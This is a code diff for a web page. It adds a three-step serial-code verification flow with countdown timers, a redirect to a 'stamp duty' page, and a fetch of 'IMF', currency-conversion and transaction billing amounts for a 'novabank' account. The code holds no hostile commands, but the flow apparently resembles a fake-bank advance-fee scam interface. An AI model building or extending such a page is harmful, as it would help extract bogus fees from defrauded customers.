+            validateFormat(inputId) {
+                const input = document.getElementById(inputId);
+                const code = input?.value || '';
+                return { valid: code.length >= 11, code: code };
+            },
+
+            async handleStep1() {
+                const input = document.getElementById('input1');  // <-- get input element
+                const validation = this.validateFormat('input1');
+                
+                if (!validation.valid) {
+                    UIManager.showError('Please enter a valid serial code (format: XXX-XXXX-XXXXXX)', 1);
+                    return;
+                }
+
+                UIManager.setButtonLoading('btn1', true);
+
+                try {
+                    await APIService.verifySerial(1, input);  // <-- pass input element here
+                    
+                    this.state.step1Completed = true;
+                    this.state.step1Code = input.dataset.rawValue || input.value.replace(/-/g, '');
+                    
+                    const targetTime = StateManager.setTimer(CONFIG.TIMER_KEY_STEP2, CONFIG.SECURITY.COUNTDOWN_DURATION);
+                    this.state.step2AvailableAt = targetTime;
+                    
+                    StateManager.saveState(this.state);
+                    
+                    UIManager.setButtonLoading('btn1', false);
+                    UIManager.showStep('step2');
+                    TimerManager.start(CONFIG.TIMER_KEY_STEP2, 'timer2', 'inputContainer2', 'waitingMessage2', null);
+                    
+                } catch (error) {
+                    UIManager.setButtonLoading('btn1', false);
+                    UIManager.showError(error.message, 1);
+                }
+            },
+
+            async handleStep2() {
+                const input = document.getElementById('input2');  // <-- get input element
+                const validation = this.validateFormat('input2');
+                
+                if (!validation.valid) {
+                    UIManager.showError('Please enter a valid serial code (format: XXX-XXXX-XXXXXX)', 2);
+                    return;
+                }
+
+                UIManager.setButtonLoading('btn2', true);
+
+                try {
+                    await APIService.verifySerial(2, input);  // <-- pass input element here
+                    
+                    this.state.step2Completed = true;
+                    this.state.step2Code = input.dataset.rawValue || input.value.replace(/-/g, '');
+                    
+                    const targetTime = StateManager.setTimer(CONFIG.TIMER_KEY_STEP3, CONFIG.SECURITY.COUNTDOWN_DURATION);
+                    this.state.step3AvailableAt = targetTime;
+                    
+                    StateManager.saveState(this.state);
+                    
+                    UIManager.setButtonLoading('btn2', false);
+                    UIManager.showStep('step3');
+                    TimerManager.start(CONFIG.TIMER_KEY_STEP3, 'timer3', 'inputContainer3', 'waitingMessage3', null);
+                    
+                } catch (error) {
+                    UIManager.setButtonLoading('btn2', false);
+                    UIManager.showError(error.message, 2);
+                }
+            },
+
+            async handleStep3() {
+                const input = document.getElementById('input3');  // <-- get input element
+                const validation = this.validateFormat('input3');
+                
+                if (!validation.valid) {
+                    UIManager.showError('Please enter a valid serial code (format: XXX-XXXX-XXXXXX)', 3);
+                    return;
+                }
+
+                UIManager.setButtonLoading('btn3', true);
+
+                try {
+                    await APIService.verifySerial(3, input);  // <-- pass input element here
+                    
+                    this.state.step3Completed = true;
+                    this.state.step3Code = input.dataset.rawValue || input.value.replace(/-/g, '');
+                    
+                    StateManager.saveState(this.state);
+                    
+                    UIManager.setButtonLoading('btn3', false);
+                    UIManager.showStep('success');
+                    setTimeout(() => {
+                        window.location.href = "stampDuty.html"
+                    }, 3000);
+                    
+                } catch (error) {
+                    UIManager.setButtonLoading('btn3', false);
+                    UIManager.showError(error.message, 3);
+                }
+            }
+         };
+
+        // // Global reset function
+        // function resetProcess() {
+        //     TimerManager.stopAll();
+        //     StateManager.clearState();
+        //     location.reload();
+        // }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            VerificationController.init();
+        });
+
+        // Handle visibility change (tab switching)
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                VerificationController.state = StateManager.getState();
+                VerificationController.restoreState();
+            }
+        });
+
+        // Tailwind config
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        accent: '#00D4FF'
+                    }
+                }
+            }
+        };
+
+        async function fetchBillingDetails() {
+    const userId = localStorage.getItem("UserId") || localStorage.getItem("user_id");
+    const token = localStorage.getItem("authToken") || localStorage.getItem("novabank_token");
+
+    if (!userId || !token) {
+        console.error("User not authenticated!");
+        // Don't alert, just log - better UX
+        return;
+    }
+
+    // Fix: Remove space in URL
+    const apiEndpoint = `https://appbanking.onrender.com/api/v1/admin/viewBilling/${userId}`;
+
+    try {
+        const response = await fetch(apiEndpoint, {
+            method: "GET",
+            headers: {
+                "Content-Type": "application/json",
+                "Authorization": `Bearer ${token}`,
+            },
+        });
+
+        const data = await response.json();
+        console.log (data)
+
+        if (!response.ok) {
+            throw new Error(data.message || "Failed to fetch billing details.");
+        }
+
+        // Helper to format currency
+        const formatAmount = (amount) => {
+            if (amount === null || amount === undefined) return "$0.00";
+            return new Intl.NumberFormat('en-US', {
+                style: 'currency',
+                currency: 'USD'
+            }).format(amount);
+        };
+
+        // Set IMF billing
+        const imfElement = document.getElementById("IMF-billing");
+        if (imfElement) {
+            imfElement.textContent = formatAmount(data.data?.firstBillingAmount);
+        }
+
+        // Set Currency conversion billing
+        const currencyElement = document.getElementById("Currency-conversion-billing");
+        if (currencyElement) {
+            currencyElement.textContent = formatAmount(data.data?.secondBillingAmount);
+        }
+
+        // Set Transaction billing
+        const transactionElement = document.getElementById("transaction-billing");
+        if (transactionElement) {
+            transactionElement.textContent = formatAmount(data.data?.thirdBillingAmount);
+        }
+
+        console.log("Billing Details:", data);
+
+    } catch (error) {
+        console.error("Error fetching billing:", error);
+        
+        // Set default values on error
+        const defaultAmount = "$0.00";
+        document.getElementById("IMF-billing") && (document.getElementById("IMF-billing").textContent = defaultAmount);
+        document.getElementById("Currency-conversion-billing") && (document.getElementById("Currency-conversion-billing").textContent = defaultAmount);
+        document.getElementById("transaction-billing") && (document.getElementById("transaction-billing").textContent = defaultAmount);
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    fetchBillingDetails();
+});
+    </script>
+</body>
+</html>
